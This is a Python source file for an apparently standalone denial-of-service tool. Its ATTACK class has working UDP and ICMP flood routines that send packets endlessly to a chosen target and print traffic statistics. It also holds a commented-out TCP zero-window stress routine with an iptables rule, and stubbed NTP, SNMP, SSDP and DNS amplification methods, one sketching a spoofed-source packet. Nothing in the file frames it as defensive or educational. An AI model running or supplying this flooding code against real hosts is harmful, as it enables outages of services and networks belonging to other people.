import os
import sys
import time
import socket
import random
import signal
import threading
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send


def calc(n, d, unit=''):
    suffix = {
        0: '',
        1: 'K',
        2: 'M',
        3: 'G',
        4: 'T'}
    i = 0
    r = float(n)
    while r/d >= 1:
        r = r/d
        i += 1
    return '{:.2f}{}{}'.format(r, suffix[i], unit)


def on_signal(sig, frame):
    print('\n')
    # print('signal:%d ' % sig + str(frame))
    print('Pressed Ctrl+C, terminated.')
    sys.exit()


class ATTACK:
    def __init__(self, args):
        self.args = args
        self.start_time = 0
        self.elapsed_time = 0
        self.packets = 0   # Number of packets sent to target
        self.bytes = 0     # Number of bytes sent to target
        # self.lock = threading.Lock()
        try:
            # thread_num = 1
            # for i in range(thread_num):
            #     t = threading.Thread(target=self.udp_flood)
            #     t.start()
            signal.signal(signal.SIGINT, on_signal)
            {
                1: self.udp_flood,
                2: self.icmp_flood,
                3: self.ntp_amplification,
                4: self.snmp_amplification,
                5: self.ssdp_amplification,
                6: self.dns_amplification
            }[self.args.type]()
        except Exception as err:
            print('\nError:', str(err))
        finally:
            sys.exit()

    def show_stats(self):
        attack = (
            '     Duration  '
            '|    Sent       '
            '|    Traffic    '
            '|    Packet/s   '
            '|     Bit/s     '
            '\n{}').format('-' * 79)
        self.start_time = time.time()
        print(attack)
        fmt = '{:^15}|{:^15}|{:^15}|{:^15}|{:^15}'
        while True:
            self.elapsed_time = time.time() - self.start_time
            bps = (self.bytes * 8) / self.elapsed_time
            pps = self.packets / self.elapsed_time
            out = fmt.format(
                '{:.2f}s'.format(self.elapsed_time),
                calc(self.packets, 1000),
                calc(self.bytes, 1024, 'B'), calc(pps, 1000, 'pps'), calc(bps, 1000, 'bps'))
            print('\r{}{}'.format(out, ' '*(75-len(out))), end='', flush=True)
            time.sleep(1)

    def udp_flood(self):
        print('\n' + ' ' * 23 + 'UDP Flooding on %s:%d\n' % (self.args.target_ip, self.args.target_port))
        t = threading.Thread(target=self.show_stats, daemon=True)
        t.start()
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        payload_bytes = len(payload)
        while True:
            client.sendto(payload, (self.args.target_ip, self.args.target_port))
            self.packets = self.packets + 1
            self.bytes = self.bytes + payload_bytes

    def icmp_flood(self):
        packet = IP(dst=self.args.target_ip) / ICMP()
        packet_bytes = len(packet)
        while True:
            send(packet, verbose=False)
            self.packets = self.packets + 1
            self.bytes = self.bytes + packet_bytes

    # def sock_stress(self):
    #     # Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
    #     os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + self.args.target_ip + ' -j DROP')
    #     while True:
    #             x = random.randint(0, 65535)
    #             response = sr1(IP(dst=self.args.target_ip) /
    #                            TCP(dport=self.args.target_port, sport=x, flags='S'), timeout=1, verbose=0)
    #             send(IP(dst=self.args.target_ip) /
    #                  TCP(dport=self.args.target_port, sport=x, flags='A', window=0, ack=(response[TCP].seq + 1)) /
    #                  '\x00\x00', verbose=0)

    def ntp_amplification(self):
        print('\n' + ' ' * 23 + 'NTP Reflecting on %s:%d\n' % (self.args.target_ip, self.args.target_port))
        # packet = IP(dst=ntpserver, src=self.args.target_ip) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=data)

    def snmp_amplification(self):
        print('SNMP Amplification Attack')

    def ssdp_amplification(self):
        print('SSDP Amplification Attack')

    def dns_amplification(self):
        print('DNS Amplification Attack')
